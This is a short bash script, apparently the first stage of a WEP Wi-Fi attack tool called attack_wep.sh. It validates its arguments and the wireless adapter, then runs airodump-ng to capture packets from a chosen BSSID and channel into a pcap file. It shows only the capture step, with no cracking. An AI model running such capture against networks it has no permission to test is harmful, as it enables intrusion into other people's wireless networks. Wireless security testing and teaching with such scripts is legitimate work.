#!/bin/bash

# Arg1 = Wifi Device
# Arg2 = Output File
# Arg3 = BSSID
# Arg4 = Channel
num_args=4	# number of arguments

if [ ! $num_args -eq $#  ]; then 
	echo "Error: invalid usage."
	echo "    ./attack_wep.sh <adapter> <output_file> <bssid> <channel>"
	exit 1
fi

ifconfig_result=$( ifconfig $1 )
if [ ! $? -eq 0 ];then
	echo "Adapter does not exist. Do you have root?"
	exit 1
fi

airodump_result=$(airodump-ng $1 --output-format pcap -w $2 --bssid $3 --channel $4)
if [ ! $? -eq 0 ];then
	echo "Unable to start airodump."
	echo $airodump_result
	exit 1
fi




